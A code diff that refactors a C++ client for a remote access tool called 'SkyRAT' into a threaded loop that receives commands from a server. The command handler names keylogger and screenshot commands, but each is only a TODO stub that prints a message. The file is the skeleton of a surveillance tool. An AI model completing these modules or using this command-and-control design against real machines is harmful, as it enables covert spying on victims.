@@ -1,6 +1,13 @@
-// Simple cross-platform C++ client for SkyRAT server
-// Works on both Windows and Linux
+// compile alternatives:
+// g++ -std=c++11 client.cpp -o client -pthread
+// g++ -std=c++11 client.cpp -o client -lws2_32
+
 #include <iostream>
+#include <thread>
+#include <cstring>
+#include <string>
+#include <atomic>
+#include <csignal>
 #ifdef _WIN32
 #include <winsock2.h>
 #pragma comment(lib, "ws2_32.lib")
@@ -14,76 +21,164 @@
 typedef int SOCKET;
 #endif
 
-int main() {
+// Configuration
+const char* SERVER_IP   = "127.0.0.1";  // Update with server IP
+const uint16_t SERVER_PORT = 4545;       // Update with server port
+const int    RECV_BUF_SIZE = 1024;
+
+// Global flag for graceful shutdown
+std::atomic<bool> g_running{true};
+
+// Signal handler for Ctrl+C
+void signal_handler(int signal) {
+    std::cout << "\n[Signal] Received signal " << signal << ". Shutting down gracefully..." << std::endl;
+    g_running = false;
+}
+
+// Initialize networking on Windows
+bool init_sockets() {
+#ifdef _WIN32
     WSADATA wsaData;
-    SOCKET sock;
-    struct sockaddr_in server;
-    char message[1024], server_reply[1024];
-    int recv_size;
-
-    // Initialize Winsock (Windows only)
-#ifdef _WIN32
-    if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
-        std::cerr << "WSAStartup failed." << std::endl;
-        return 1;
-    }
+    return WSAStartup(MAKEWORD(2,2), &wsaData) == 0;
+#else
+    return true;
 #endif
+}
 
-    // Create socket
-    sock = socket(AF_INET, SOCK_STREAM, 0);
+// Cleanup networking on Windows
+void cleanup_sockets() {
+#ifdef _WIN32
+    WSACleanup();
+#endif
+}
+
+// Create and return a connected socket, or INVALID_SOCKET on error
+SOCKET connect_to_server(const char* ip, uint16_t port) {
+    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
     if (sock == INVALID_SOCKET) {
-        std::cerr << "Could not create socket." << std::endl;
-#ifdef _WIN32
-        WSACleanup();
-#endif
-        return 1;
+        std::cerr << "Error: Could not create socket." << std::endl;
+        return INVALID_SOCKET;
     }
 
-    server.sin_addr.s_addr = inet_addr("127.0.0.1"); // Update with server IP
-    server.sin_family = AF_INET;
-    server.sin_port = htons(4444); // Update with server port
+    sockaddr_in serverAddr{};
+    serverAddr.sin_family = AF_INET;
+    serverAddr.sin_port   = htons(port);
+    serverAddr.sin_addr.s_addr = inet_addr(ip);
 
-    // Connect to server
-    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
-        std::cerr << "Connection failed." << std::endl;
+    if (connect(sock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
+        std::cerr << "Error: Connection failed." << std::endl;
 #ifdef _WIN32
         closesocket(sock);
-        WSACleanup();
 #else
         close(sock);
 #endif
-        return 1;
-    }
-    std::cout << "Connected to server." << std::endl;
-
-    // Send a message
-    strcpy(message, "Hello from client!");
-    if (send(sock, message, strlen(message), 0) < 0) {
-        std::cerr << "Send failed." << std::endl;
-#ifdef _WIN32
-        closesocket(sock);
-        WSACleanup();
-#else
-        close(sock);
-#endif
-        return 1;
+        return INVALID_SOCKET;
     }
 
-    // Receive a reply
-    recv_size = recv(sock, server_reply, sizeof(server_reply) - 1, 0);
-    if (recv_size == SOCKET_ERROR) {
-        std::cerr << "Receive failed." << std::endl;
-    } else {
-        server_reply[recv_size] = '\0';
-        std::cout << "Server reply: " << server_reply << std::endl;
+    return sock;
+}
+
+// Send a null-terminated C-string message
+bool send_message(SOCKET sock, const char* msg) {
+    size_t len = std::strlen(msg);
+    return send(sock, msg, static_cast<int>(len), 0) != SOCKET_ERROR;
+}
+
+// Receive into buffer, returns bytes received or -1 on error
+int receive_reply(SOCKET sock, char* buffer, int bufSize) {
+    int bytes = recv(sock, buffer, bufSize - 1, 0);
+    if (bytes > 0) buffer[bytes] = '\0';
+    return bytes;
+}
+
+// Handle different commands from server
+void handle_command(const std::string& command) {
+    std::cout << "[Command] Received: " << command << std::endl;
+    
+    if (command == "START_KEYLOGGER") {
+        std::cout << "[Action] Starting keylogger module..." << std::endl;
+        // TODO: Implement keylogger functionality
+    }
+    else if (command == "TAKE_SCREENSHOT") {
+        std::cout << "[Action] Taking screenshot..." << std::endl;
+        // TODO: Implement screenshot functionality
+    }
+    else if (command == "STOP_KEYLOGGER") {
+        std::cout << "[Action] Stopping keylogger..." << std::endl;
+        // TODO: Stop keylogger
+    }
+    else {
+        std::cout << "[Action] Unknown command, echoing back: " << command << std::endl;
+    }
+}
+
+// Thread worker: handles one connection lifecycle
+void handle_connection() {
+    if (!init_sockets()) {
+        std::cerr << "Error: Socket subsystem init failed." << std::endl;
+        return;
     }
 
-    // Cleanup
+    SOCKET sock = connect_to_server(SERVER_IP, SERVER_PORT);
+    if (sock == INVALID_SOCKET) {
+        cleanup_sockets();
+        return;
+    }
+    std::cout << "[Thread] Connected to server on " << SERVER_IP << ":" << SERVER_PORT << std::endl;
+
+    // Send initial greeting
+    const char* greeting = "Hello from threaded client!";
+    if (!send_message(sock, greeting)) {
+        std::cerr << "Error: Send failed." << std::endl;
+        goto cleanup;
+    }
+    std::cout << "[Thread] Sent greeting to server" << std::endl;
+
+    // Keep listening for server commands
+    char buffer[RECV_BUF_SIZE];
+    while (g_running) {
+        int received = receive_reply(sock, buffer, RECV_BUF_SIZE);
+        if (received > 0) {
+            std::string command(buffer);
+            handle_command(command);
+            
+            // Send acknowledgment back to server
+            std::string ack = "ACK: " + command;
+            if (!send_message(sock, ack.c_str())) {
+                std::cerr << "Error: Failed to send acknowledgment." << std::endl;
+                break;
+            }
+        } else if (received == 0) {
+            std::cout << "[Thread] Server closed the connection." << std::endl;
+            break;
+        } else {
+            std::cerr << "Error: Receive failed." << std::endl;
+            break;
+        }
+    }
+
+cleanup:
 #ifdef _WIN32
     closesocket(sock);
-    WSACleanup();
 #else
     close(sock);
 #endif
+
+    cleanup_sockets();
+    std::cout << "[Thread] Connection closed." << std::endl;
+}
+
+int main() {
+    std::cout << "Starting SkyRAT threaded client..." << std::endl;
+    
+    // Set up signal handler for graceful shutdown
+    std::signal(SIGINT, signal_handler);
+    
+    // Spawn connection thread
+    std::thread clientThread(handle_connection);
+
+    // Wait for client thread to finish
+    clientThread.join();
+    std::cout << "Client thread finished. Exiting." << std::endl;
     return 0;
 }
